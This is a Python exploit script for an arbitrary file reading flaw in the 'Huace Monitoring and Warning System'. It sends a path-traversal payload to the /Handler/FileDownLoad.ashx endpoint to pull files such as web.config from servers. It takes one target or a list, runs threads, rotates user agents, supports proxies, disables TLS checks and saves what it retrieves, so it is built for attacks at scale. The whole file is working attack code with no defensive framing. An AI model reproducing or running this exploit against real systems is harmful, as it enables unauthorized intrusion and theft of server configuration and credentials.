import argparse
import copy
import os
import random
import re
import string
import time
import requests
import concurrent.futures
from user_agent import get_user_agent_pc


headers = None
proxies = None
timeout = None
delay = None
thread = None
output = None
DEFAULT_USER_AGENT = 'Mozilla/5.0.html (Windows NT 6.1; WOW64; rv:34.0.html) Gecko/20100101 Firefox/34.0.html'
DEFAULT_DOWNLOAD_FILE = "..%2F..%2Fweb.config"
DEFAULT_OUTPUT_FILE = "res.txt"
MIN_VARIABLE_NUM = 1
MAX_VARIABLE_NUM = 10
MAX_LENGTH = 10


def set_cmd_arg() -> any:
    description = 'Huace Monitoring and Warning System Arbitrary File Reading Vulnerability'
    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    parser.add_argument('--random-agent', type=bool, default=True, help='Using random user agents')
    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str, required=False, help='Set up the proxy')
    parser.add_argument('--path', type=str, required=False, default="..%2F..%2Fweb.config", help='Enter the file you want to read')
    parser.add_argument('--save-path', type=str, required=False, help='Enter the save path of file you want to read')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    options = dict()
    if args.random_agent is not None and args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = DEFAULT_USER_AGENT
    options.setdefault('user_agent', user_agent)
    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 1)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)
    options.setdefault('path', args.path if args.path is not None else DEFAULT_DOWNLOAD_FILE)
    options.setdefault('save_path', args.save_path if args.save_path is not None else DEFAULT_OUTPUT_FILE)
    o.setdefault('options', {"type": "str", "value": options})
    return o


def get_data_brute_params(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != 200:
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]
    return brute_list


def get_data_from_file(filename: str, mode: str) -> tuple:
    def check_filename(name: str) -> (int, str or None):
        if not os.path.isabs(name):
            name = os.path.abspath(os.path.join(os.getcwd(), name))
        if not os.path.exists(name):
            return 404, f"[!]{name} does not exist"
        if not os.path.isfile(name):
            return 405, f"[!]{name} is Not a legal document"
        return 200, name

    try:
        code, content = check_filename(filename)
        if code != 200:
            return code, content
        with open(filename, mode=mode) as f:
            content = f.read().split("\n")
        return 200, content
    except Exception as e:
        print(e.args.__str__())
        return 200, f"[!]Unexpected error occurred during file processing while opening {filename}"


def parse_param(o: dict) -> (list, str, str):
    global proxies, headers, timeout, delay, thread

    def check_proxy(content: str) -> (int, str):
        mode = re.compile("^(?P<protocol>(http|https|socks4|socks5>))://([A-Za-z0-9]*:[A-Za-z0-9]*@)?([A-Za-z0-9.\-]+)(:[0-9]+)?(/[A-Za-z0-9./]*)?", re.I)
        groups = mode.search(content)
        if groups is None:
            return 500, "Unreasonable proxy settings"
        try:
            protocol = groups.group("protocol")
            return 200, protocol
        except Exception as e:
            return 404, "Failed to identify the protocol used by the agent"

    brute_list = get_data_brute_params(o)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)

    if options:
        options = options[0]
    _proxy = options.get('proxy', None)
    _path = options.get('path', DEFAULT_DOWNLOAD_FILE)
    _save_path = options.get('save_path', DEFAULT_OUTPUT_FILE)

    if _proxy is None or not _proxy:
        proxies = _proxy
    else:
        code, content = check_proxy(_proxy)
        if code != 200:
            proxies = _proxy
        else:
            proxies = dict()
            proxies.setdefault(content, _proxy)

    headers = dict() if headers is None or not headers else headers
    headers.setdefault("User-Agent", options.get('user_agent', DEFAULT_USER_AGENT))
    timeout = options.get('time_out', 0)
    delay = options.get('delay', 0)
    thread = options.get('thread', 1)

    return urls, _path, _save_path


def create_random_variable_name(length: int, is_value: bool = False) -> tuple:
    _start = 0 if is_value else 1
    if length < 1 or length > MAX_LENGTH:
        if is_value:
            length = 1
        else:
            length = 2
    letters = string.ascii_letters
    nums_letters = string.ascii_letters + string.digits
    _prefix = ''.join(random.choice(letters) for _ in range(_start))
    _suffix = ''.join(random.choice(nums_letters) for _ in range(length))
    o = _prefix + _suffix
    return o, length


def create_random_variable_length() -> int:
    return random.randint(MIN_VARIABLE_NUM, MAX_VARIABLE_NUM)


def attack(url: str, _headers: dict, path: str, save_path: str):
    _path = path.replace("/", "%2F")
    _path = _path.replace("\\", "%2E")
    data = f"filename={save_path}&filepath={_path}"
    print(data)
    try:
        res = requests.post(url=url, data=data, headers=headers, proxies=proxies, timeout=(5, 10), verify=False)
        if res.status_code < 400:
            print(f"""[+]正在尝试攻击{url}...[+]""")
            data = res.content.decode(res.encoding if res.encoding is not None else "UTF-8")
            with open(save_path, "w") as f:
                f.write(data)
        else:
            print(res.status_code)
    except Exception as e:
        print(f"""[*]正在尝试攻击{url} but {e.args.__str__()}""")


def task(urls: list, path: str, save_path: str):
    attack_url = "/Handler/FileDownLoad.ashx"
    _headers = copy.deepcopy(headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        for url in urls:
            executor.submit(attack, url + attack_url, _headers, path, save_path)
            time.sleep(delay if delay is not None else 0)


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    urls, path, save_path = parse_param(obj)
    task(urls, path, save_path)


if __name__ == '__main__':
    main()
